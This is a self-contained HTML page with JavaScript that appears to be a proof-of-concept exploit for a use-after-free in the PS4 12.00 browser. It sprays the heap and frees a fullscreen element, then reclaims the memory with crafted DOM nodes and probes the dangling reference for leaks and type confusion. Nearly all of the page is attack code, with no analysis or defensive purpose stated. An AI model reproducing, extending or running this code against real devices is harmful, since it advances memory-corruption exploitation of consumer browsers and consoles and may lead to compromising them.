<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - UAF Conversion FINAL</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>UAF Conversion - Real Type Confusion</h2>
<button onclick="runTest()">Run Test</button>

<script>

let logBuffer = [];
function log(msg){
    try{console.log(msg);}catch(e){}
    logBuffer.push(msg);
}

// ==========================
function setupHeap(){
    let arrs=[];
    for(let i=0;i<5000;i++){
        let a=new Float64Array(8);
        a[0]=i;
        arrs.push(a);
    }
    return arrs;
}

// ==========================
function setupFullscreen(){
    let fsTarget=document.createElement("div");

    fsTarget.innerHTML="<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";

    Object.assign(fsTarget.style,{
        background:"black",
        width:"100%",
        height:"100%",
        position:"absolute",
        top:"0",
        left:"0"
    });

    document.body.appendChild(fsTarget);

    fsTarget.webkitRequestFullscreen?.();

    return fsTarget;
}

// ==========================
function preciseReclaim(size){
    log("[*] Reclaim size = "+size);

    let bucket=[];

    // churn
    for(let i=0;i<3000;i++){
        let el=document.createElement("div");
        document.body.appendChild(el);
        el.remove();
    }

    for(let i=0;i<size;i++){

        let el;

        // 🔥 alterna tipos (ESSENCIAL)
        if(i % 4 === 0){
            el = document.createElement("div");
            el.innerHTML = "CTRL_"+i+"_41414141";

        } else if(i % 4 === 1){
            el = document.createElement("svg"); // 🔥 tipo diferente
            el.innerHTML = "<circle cx='50' cy='50' r='40'></circle>";

        } else if(i % 4 === 2){
            el = document.createTextNode("TXT_"+i+"_BBBBBBBB"); // 🔥 TextNode direto

            document.body.appendChild(el);
            bucket.push(el);
            continue;

        } else {
            el = document.createElement("div");
            el.innerHTML = "<img src=x onerror=console.log('X')>";
        }

        // estilo pesado (mantém reuse visual)
        if(el.style){
            Object.assign(el.style,{
                background:"black",
                width:"100%",
                height:"100%",
                position:"absolute",
                top:"0",
                left:"0"
            });
        }

        document.body.appendChild(el);
        bucket.push(el);
    }

    return bucket;
}

// ==========================
function deepProbe(fsTarget){
    log("---- DEEP PROBE ----");

    try{
        let html=fsTarget.innerHTML;
        log("[CHECK] innerHTML = "+html);
    }catch(e){
        log("[CRASH] innerHTML");
    }

    // 🔥 leitura via child
    try{
        let child=fsTarget.firstChild;

        log("[CHECK] child = "+child);

        if(child){
            log("[CHECK] childType = "+child.nodeType);

            try{
                log("[LEAK?] textContent = "+child.textContent);
            }catch(e){
                log("[CRASH] textContent");
            }

            try{
                log("[LEAK?] nodeValue = "+child.nodeValue);
            }catch(e){
                log("[CRASH] nodeValue");
            }

            try{
                // tentativa de confusão
                child.innerHTML="X";
                log("[PWN] innerHTML write OK");
            }catch(e){
                log("[TYPE CONFUSION] write crash");
            }
        }

    }catch(e){
        log("[CRASH] firstChild");
    }

    // 🔥 layout vs JS mismatch
    try{
        let rect=fsTarget.getBoundingClientRect();
        log("[CHECK] rect = "+rect.width);
    }catch(e){
        log("[UAF] rect crash");
    }

    try{
        let h=fsTarget.offsetHeight;
        log("[CHECK] layout = "+h);
    }catch(e){
        log("[UAF] layout crash");
    }

    try{
        let p=fsTarget.parentNode;
        log("[CHECK] parent = "+p);
    }catch(e){
        log("[CRASH] parent");
    }
}

// ==========================
function trigger(fsTarget){
    log("[*] Trigger");

    try{
        fsTarget.remove();

        document.webkitExitFullscreen?.();

    }catch(e){}

    let sizes=[2000,2500,3000];

    sizes.forEach((s,i)=>{
        setTimeout(()=>preciseReclaim(s),i*50);
    });

    setTimeout(()=>deepProbe(fsTarget),20);
    setTimeout(()=>deepProbe(fsTarget),80);
    setTimeout(()=>deepProbe(fsTarget),150);

    setTimeout(()=>{
        alert(logBuffer.join("\n"));
    },400);

    setTimeout(()=>location.reload(),600);
}

// ==========================
function runTest(){
    log("[*] Iniciando teste");

    setupHeap();
    let fsTarget=setupFullscreen();

    window.onblur=function(){
        log("[*] onblur");
        setTimeout(()=>trigger(fsTarget),3000);
    };
}

</script>

</body>
</html>
